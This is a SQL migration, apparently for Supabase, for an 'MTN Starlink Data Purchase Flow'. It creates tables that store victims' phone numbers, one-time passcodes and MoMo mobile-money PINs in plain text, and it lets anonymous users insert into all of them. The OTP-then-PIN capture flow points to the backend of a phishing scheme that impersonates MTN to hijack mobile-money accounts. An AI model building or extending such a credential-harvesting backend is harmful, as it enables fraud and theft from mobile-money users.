/*
  # MTN Starlink Data Purchase Flow Database

  1. New Tables
    - `phone_submissions`
      - `id` (uuid, primary key)
      - `phone_number` (text) - Full phone number with prefix
      - `privacy_agreed` (boolean) - Whether user agreed to privacy policy
      - `created_at` (timestamptz) - Submission timestamp
    
    - `otp_submissions`
      - `id` (uuid, primary key)
      - `phone_number` (text) - Reference to phone number
      - `otp_code` (text) - OTP code entered by user
      - `created_at` (timestamptz) - Submission timestamp
    
    - `momo_pin_submissions`
      - `id` (uuid, primary key)
      - `phone_number` (text) - Reference to phone number
      - `momo_pin` (text) - MoMo PIN entered by user
      - `created_at` (timestamptz) - Submission timestamp

  2. Security
    - Enable RLS on all tables
    - Add policies for public insert access (as this is a data collection form)
*/

CREATE TABLE IF NOT EXISTS phone_submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  phone_number text NOT NULL,
  privacy_agreed boolean DEFAULT false,
  created_at timestamptz DEFAULT now()
);

CREATE TABLE IF NOT EXISTS otp_submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  phone_number text NOT NULL,
  otp_code text NOT NULL,
  created_at timestamptz DEFAULT now()
);

CREATE TABLE IF NOT EXISTS momo_pin_submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  phone_number text NOT NULL,
  momo_pin text NOT NULL,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE phone_submissions ENABLE ROW LEVEL SECURITY;
ALTER TABLE otp_submissions ENABLE ROW LEVEL SECURITY;
ALTER TABLE momo_pin_submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow public insert on phone_submissions"
  ON phone_submissions
  FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Allow public insert on otp_submissions"
  ON otp_submissions
  FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Allow public insert on momo_pin_submissions"
  ON momo_pin_submissions
  FOR INSERT
  TO anon
  WITH CHECK (true);